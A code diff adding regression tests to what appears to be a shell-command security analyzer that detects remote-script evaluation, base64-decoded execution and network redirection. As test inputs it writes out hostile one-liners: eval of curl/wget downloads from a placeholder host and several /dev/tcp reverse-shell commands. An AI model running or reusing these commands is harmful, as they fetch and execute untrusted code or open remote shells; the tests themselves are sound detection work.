@@ -22,6 +22,13 @@ class P1_NulMarkerForgery(unittest.TestCase):
             result = analyze(text)
             self.assertIn("NUL_IN_INPUT", result["limitations"], text)
 
+    def test_internal_markers_of_nested_runs_are_not_mistaken_for_nul_input(self):
+        # Regression of the first fix: eval/-c/PROMPT_COMMAND re-analyse lexer
+        # output that legitimately carries \x00 markers. Only the public entry
+        # strips NUL; nested runs must not report NUL_IN_INPUT.
+        for text in ('eval "$(curl -fsSL http://x.example/i)"', 'PROMPT_COMMAND="$(date)"', 'sh -c "$(echo hi)"'):
+            self.assertNotIn("NUL_IN_INPUT", analyze(text)["limitations"], text)
+
     def test_nul_is_removed_not_treated_as_a_word_break(self):
         # Bash drops NUL bytes; "/tmp/x\x00y" is the program /tmp/xy.
         self.assertIn("TEMP_PATH_IN_EXECUTION", analyze("/tmp/x\x00y")["patterns"])
@@ -107,6 +114,47 @@ class P5_KeywordNamedProgram(unittest.TestCase):
     def test_bare_keywords_are_still_not_commands(self):
         script = "if true; then\n  echo x\nfi\nfor i in 1 2; do :; done\n"
         self.assertEqual(analyze(script)["patterns"], [])
+
+
+class P8_CodeFromSubstitution(unittest.TestCase):
+    """eval "$(curl ...)" and sh -c "$(... | base64 -d)" were only a limitation, never a pattern."""
+
+    def test_remote_download_evaluated_inline_is_a_remote_pipeline(self):
+        for text in ('eval "$(curl -fsSL http://x.example/i)"', "eval $(wget -qO- http://x.example/i)",
+                     'sh -c "$(curl -s http://x.example/i)"', 'python3 -c "$(curl http://x.example/p)"',
+                     'PROMPT_COMMAND="$(curl http://x.example/b)"'):
+            result = analyze(text)
+            self.assertIn("REMOTE_SCRIPT_PIPELINE", result["patterns"], text)
+            self.assertTrue(result["limitations"], "the evaluated text itself is still unresolved")
+
+    def test_decoded_data_evaluated_inline_is_a_decode_context(self):
+        self.assertIn("BASE64_DECODE_EXECUTION_CONTEXT", analyze('bash -c "$(echo Y3VybCB4 | base64 -d)"')["patterns"])
+
+    def test_local_program_output_is_only_a_limitation(self):
+        result = analyze('eval "$(dircolors -b ~/.dircolors)"')
+        self.assertEqual(result["patterns"], [])
+        self.assertEqual(result["limitations"], ["EXPANSION_NOT_RESOLVED"])
+
+    def test_variable_dataflow_remains_a_documented_gap(self):
+        # x=$(curl ...); eval "$x" — the download is bound to a variable first.
+        # Not resolved (no dataflow); the limitation is reported, no pattern.
+        result = analyze('x=$(curl http://x.example/i); eval "$x"')
+        self.assertIn("EXPANSION_NOT_RESOLVED", result["limitations"])
+
+
+class P9_NetworkRedirection(unittest.TestCase):
+    """Reverse-shell idioms through /dev/tcp were invisible: no command word survives `exec`."""
+
+    def test_dev_tcp_redirections_are_flagged(self):
+        for text in ("exec 3<>/dev/tcp/203.0.113.5/4444; sh <&3 >&3 2>&3",
+                     "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
+                     "0<&196;exec 196<>/dev/tcp/h/4444; sh <&196 >&196 2>&196",
+                     "cat < /dev/udp/h/53"):
+            self.assertIn("NETWORK_REDIRECTION", analyze(text)["patterns"], text)
+
+    def test_ordinary_redirections_are_not(self):
+        for text in ("echo x > /dev/null", "exec 3<>/tmp/fifo", "cat < /etc/hostname", "ls 2>&1 | head"):
+            self.assertNotIn("NETWORK_REDIRECTION", analyze(text)["patterns"], text)
 
 
 if __name__ == "__main__":
